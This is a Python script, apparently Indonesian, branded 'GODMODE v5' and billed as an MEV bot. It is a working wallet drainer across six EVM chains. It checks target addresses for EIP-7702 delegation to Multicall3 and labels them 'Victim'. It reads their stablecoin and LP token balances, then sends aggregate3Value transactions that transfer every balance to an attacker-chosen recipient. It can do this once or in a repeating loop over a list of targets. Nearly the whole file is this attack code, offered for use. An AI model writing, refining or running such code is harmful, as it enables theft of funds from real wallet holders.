"""
GODMODE v5 - FINAL VERSION
────────────────────────────────────────────────────────────
🔥 Full Auto MEV Bot menggunakan EIP-7702 + Multicall3
Fitur:
- Multi Chain Support (6 jaringan)
- Stable RPC + Fallback
- Auto EIP-7702 Detection
- Auto Token & LP Scanning
- Auto Sweep Execution
- Auto MEV Loop Mode
- Gas Optimization + Safety
────────────────────────────────────────────────────────────
"""

import asyncio
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from web3 import AsyncWeb3, Web3
from eth_account import Account

# ==================== CONFIG ====================
MULTICALL3 = Web3.to_checksum_address("0xcA11bde05977b3631167028862bE2a173976CA11")
EIP7702_PREFIX = bytes.fromhex("ef0100")

RPC_FALLBACKS: Dict[int, List[str]] = {
    1: ["https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
    56: ["https://bsc-dataseed.binance.org", "https://bsc-rpc.publicnode.com"],
    137: ["https://polygon-rpc.com", "https://polygon.llamarpc.com"],
    42161: ["https://arb1.arbitrum.io/rpc", "https://arbitrum.llamarpc.com"],
    10: ["https://mainnet.optimism.io", "https://optimism.llamarpc.com"],
    8453: ["https://mainnet.base.org", "https://base.llamarpc.com", "https://base-rpc.publicnode.com"],
}

TOKENS_PER_CHAIN: Dict[int, Dict[str, List[str]]] = {
    1: {
        "tokens": ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0xdAC17F958D2ee523a2206206994597C13D831ec7"],
        "lp": ["0x0d4a11d5eeaac28ec3f61d100daf4d40471f1852"]
    },
    56: {
        "tokens": ["0x55d398326f99059fF775485246999027B3197955", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"],
        "lp": ["0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae"]
    },
    8453: {
        "tokens": ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"],
        "lp": []
    },
    137: {"tokens": [], "lp": []},
    42161: {"tokens": [], "lp": []},
    10: {"tokens": [], "lp": []},
}

MULTICALL3_ABI = [
    {
        "name": "aggregate3Value",
        "type": "function",
        "stateMutability": "payable",
        "inputs": [{"name": "calls", "type": "tuple[]", "components": [
            {"name": "target", "type": "address"},
            {"name": "allowFailure", "type": "bool"},
            {"name": "value", "type": "uint256"},
            {"name": "callData", "type": "bytes"}
        ]}],
        "outputs": [{"name": "returnData", "type": "tuple[]", "components": [
            {"name": "success", "type": "bool"},
            {"name": "returnData", "type": "bytes"}
        ]}]
    }
]

ERC20_ABI = [
    {"name": "balanceOf", "type": "function", "stateMutability": "view",
     "inputs": [{"name": "account", "type": "address"}], "outputs": [{"name": "", "type": "uint256"}]},
    {"name": "symbol", "type": "function", "stateMutability": "view", "outputs": [{"name": "", "type": "string"}]},
    {"name": "transfer", "type": "function", "stateMutability": "nonpayable",
     "inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}], "outputs": [{"name": "", "type": "bool"}]},
]


@dataclass
class Victim:
    address: str
    chain_id: int
    tokens: List[dict] = field(default_factory=list)
    lp_tokens: List[dict] = field(default_factory=list)
    is_delegated: bool = False
    delegated_to: str = ""


class GodModeFinal:
    def __init__(self, private_key: str):
        self.account = Account.from_key(private_key)
        self.w3: Optional[AsyncWeb3] = None
        self.chain_id: int = 0

    async def connect(self, chain_id: int) -> bool:
        for rpc in RPC_FALLBACKS.get(chain_id, []):
            try:
                w3 = AsyncWeb3(AsyncWeb3.AsyncHTTPProvider(rpc))
                if await w3.is_connected():
                    self.w3 = w3
                    self.chain_id = chain_id
                    print(f"[+] Connected to chain {chain_id}")
                    return True
            except Exception:
                continue
        print(f"[!] Gagal connect ke chain {chain_id}")
        return False

    async def is_eip7702_delegated(self, address: str) -> tuple[bool, str]:
        try:
            code = await self.w3.eth.get_code(Web3.to_checksum_address(address))
            if len(code) == 23 and code[:3] == EIP7702_PREFIX:
                delegated = Web3.to_checksum_address("0x" + code[3:23].hex())
                return delegated.lower() == MULTICALL3.lower(), delegated
            return False, ""
        except:
            return False, ""

    async def scan_wallet(self, address: str) -> Victim:
        victim = Victim(address=address, chain_id=self.chain_id)
        is_del, delegated = await self.is_eip7702_delegated(address)
        victim.is_delegated = is_del
        victim.delegated_to = delegated

        if not is_del:
            return victim

        print(f"\n[*] Scanning {address} (Delegated)")
        token_config = TOKENS_PER_CHAIN.get(self.chain_id, {"tokens": [], "lp": []})

        # Scan Tokens
        for token_addr in token_config["tokens"]:
            try:
                contract = self.w3.eth.contract(address=Web3.to_checksum_address(token_addr), abi=ERC20_ABI)
                balance = await contract.functions.balanceOf(address).call()
                if balance > 0:
                    symbol = await contract.functions.symbol().call()
                    victim.tokens.append({"address": token_addr, "symbol": symbol, "balance": balance})
                    print(f"    [+] {symbol}: {balance}")
            except:
                pass

        # Scan LP Tokens
        for lp_addr in token_config["lp"]:
            try:
                contract = self.w3.eth.contract(address=Web3.to_checksum_address(lp_addr), abi=ERC20_ABI)
                balance = await contract.functions.balanceOf(address).call()
                if balance > 0:
                    victim.lp_tokens.append({"address": lp_addr, "balance": balance})
                    print(f"    [+] LP Token: {lp_addr} ({balance})")
            except:
                pass

        return victim

    def build_sweep_calls(self, assets: List[dict], recipient: str) -> List[dict]:
        calls = []
        for asset in assets:
            contract = self.w3.eth.contract(address=Web3.to_checksum_address(asset["address"]), abi=ERC20_ABI)
            calldata = contract.encode_abi("transfer", args=[Web3.to_checksum_address(recipient), asset["balance"]])
            calls.append({
                "target": asset["address"],
                "allowFailure": False,
                "value": 0,
                "callData": calldata
            })
        return calls

    async def execute_sweep(self, victim: Victim, recipient: str, dry_run: bool = False):
        all_assets = victim.tokens + victim.lp_tokens
        if not all_assets:
            print("[-] Tidak ada aset.")
            return

        calls = self.build_sweep_calls(all_assets, recipient)

        mc = self.w3.eth.contract(address=MULTICALL3, abi=MULTICALL3_ABI)
        tx_data = mc.encode_abi("aggregate3Value", args=[calls])

        tx = {
            "from": self.account.address,
            "to": victim.address,
            "value": 0,
            "data": tx_data,
            "chainId": self.chain_id,
        }

        try:
            gas_estimate = await self.w3.eth.estimate_gas(tx)
            tx["gas"] = int(gas_estimate * 1.3)
        except:
            tx["gas"] = 1_000_000

        print(f"\n[INFO] Akan mengirim {len(calls)} call ke {victim.address}")
        if dry_run:
            print("[DRY RUN] Transaksi tidak dikirim.")
            return

        if input("Kirim transaksi? (y/n): ").lower() != "y":
            return

        signed = self.w3.eth.account.sign_transaction(tx, self.account.key)
        tx_hash = await self.w3.eth.send_raw_transaction(signed.raw_transaction)
        print(f"[+] Transaction Hash: {tx_hash.hex()}")

    async def auto_mev_loop(self, targets: List[str], recipient: str, interval: int = 40, dry_run: bool = False):
        print("\n🚀 AUTO MEV MODE AKTIF\n")
        while True:
            for address in targets:
                victim = await self.scan_wallet(address)
                if victim.is_delegated and (victim.tokens or victim.lp_tokens):
                    print(f"\n🎯 Aset ditemukan: {address}")
                    await self.execute_sweep(victim, recipient, dry_run=dry_run)
            await asyncio.sleep(interval)

    async def run(self):
        print("🔥 GODMODE v5 - FINAL VERSION")
        chain_id = int(input("Chain ID (1=ETH, 56=BSC, 8453=Base): "))

        if not await self.connect(chain_id):
            return

        recipient = input("Recipient Address: ").strip()
        dry_run = input("Gunakan Dry Run? (y/n): ").lower() == "y"

        print("\nPilih Mode:")
        print("1. Auto MEV Loop")
        print("2. Scan Sekali + Execute")

        choice = input("Pilihan (1/2): ")

        if choice == "1":
            targets_input = input("Target addresses (pisah dengan koma): ")
            targets = [addr.strip() for addr in targets_input.split(",")]
            await self.auto_mev_loop(targets, recipient, dry_run=dry_run)
        else:
            target = input("Target address: ").strip()
            victim = await self.scan_wallet(target)
            if victim.tokens or victim.lp_tokens:
                await self.execute_sweep(victim, recipient, dry_run=dry_run)


if __name__ == "__main__":
    private_key = input("Private Key: ").strip()
    bot = GodModeFinal(private_key)
    asyncio.run(bot.run())
